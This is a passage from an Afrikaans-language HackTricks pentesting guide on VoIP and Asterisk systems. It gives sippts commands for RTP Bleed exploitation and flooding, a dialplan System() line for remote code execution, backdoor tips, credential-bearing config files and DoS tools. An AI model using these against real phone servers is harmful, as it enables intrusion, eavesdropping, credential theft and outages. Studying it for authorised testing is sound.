* **`SIPPTS rtpbleed`** van [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed ontdek die RTP Bleed kwetsbaarheid deur RTP-strome te stuur.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed ontdek die RTP Bleed kwetsbaarheid deur RTCP-strome te stuur.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** van [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood benut die RTP Bleed kwetsbaarheid deur RTP-strome te stuur.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject benut die RTP Bleed kwetsbaarheid deur 'n klankl√™er (WAV-formaat) in te spuit.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk slaag jy daarin om op een of ander manier **uitbreidingsre√´ls by te voeg en hulle te herlaai** (byvoorbeeld deur 'n kwesbare webbestuurderbediener te kompromiteer), is dit moontlik om RCE te kry deur die **`System`** bevel te gebruik.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Daar is 'n bevel genaamd **`Shell`** wat gebruik kan word **in plaas van `System`** om stelselopdragte uit te voer indien nodig.

{% hint style="warning" %}
As die bediener die gebruik van sekere karakters in die **`System`** bevel verbied (soos in Elastix), kontroleer of die webbediener toelaat om op een of ander manier l√™ers binne die stelsel te **skep** (soos in Elastix of trixbox), en gebruik dit om 'n agterdeur-skrip te **skep** en gebruik dan **`System`** om daardie **skrip** uit te **voer**.
{% endhint %}

#### Interessante plaaslike l√™ers en regte

* **`sip.conf`** -> Bevat die wagwoord van SIP-gebruikers.
* As die **Asterisk-bedieners as 'n rootgebruiker hardloop**, kan jy root kompromitteer
* **mysql root-gebruiker** het moontlik **geen wagwoord nie**.
* dit kan gebruik word om 'n nuwe mysql-gebruiker as agterdeur te skep
* **`FreePBX`**
* **`amportal.conf`** -> Bevat die wagwoord van die webpaneel-administrateur (FreePBX)
* **`FreePBX.conf`** -> Bevat die wagwoord van die gebruiker FreePBXuser wat gebruik word om toegang tot die databasis te verkry
* dit kan gebruik word om 'n nuwe mysql-gebruiker as agterdeur te skep
* **`Elastix`**
* **`Elastix.conf`** -> Bevat verskeie wagwoorde in die teks soos mysql root wagwoord, IMAPd wagwoord, web-admin wagwoord
* **Verskeie vouers** sal aan die gekompromitteerde asterisk-gebruiker behoort (as dit nie as 'n rootgebruiker hardloop nie). Hierdie gebruiker kan die vorige l√™ers lees en ook die konfigurasie beheer, sodat hy Asterisk kan maak om ander agterdeur-bin√™re l√™ers te laai wanneer dit uitgevoer word.

### RTP-inspuiting

Dit is moontlik om 'n **`.wav`** in gesprekke in te voeg met behulp van gereedskap soos **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) en **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Of jy kan die skripte van [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) gebruik om **gesprekke te skandeer** (**`rtpscan.pl`**), 'n `.wav` na 'n gesprek te stuur (**`rtpsend.pl`**) en **geraas in 'n gesprek in te voeg** (**`rtpflood.pl`**).

### DoS

Daar is verskeie maniere om DoS in VoIP-bedieners te probeer bereik.

* **`SIPPTS flood`** van [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood stuur onbeperkte boodskappe na die teiken.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** van [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping maak 'n SIP-ping om die bediener se responstyd te sien.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX-protokol wat deur Asterisk gebruik word
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): 'n Gereedskap om SIP/SDP INVITE-boodskappe oor UDP/IP te oorlaai.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Stuur verskeie goedgevormde RTP-pakkette. Dit is nodig om die RTP-poorte wat gebruik word te ken (sniff eers).
* [**SIPp**](https://github.com/SIPp/sipp): Laat toe om SIP-verkeer te analiseer en te genereer. dit kan dus ook gebruik word vir DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Swiss-armmes. Kan ook gebruik word om SIP-aanvalle uit te voer.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Bedryfstelselkwesbaarhede

Die maklikste manier om 'n sagteware soos Asterisk te installeer, is om 'n **BS-verspreiding** te aflaai wat dit reeds ge√Ønstalleer het, soos: **FreePBX, Elastix, Trixbox**... Die probleem met daardie is dat sodra dit werkende is, mag **sisteemadministrateurs dit dalk nie weer opdateer nie** en **kwesbaarhede** sal met tyd ontdek word.

## Verwysings

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
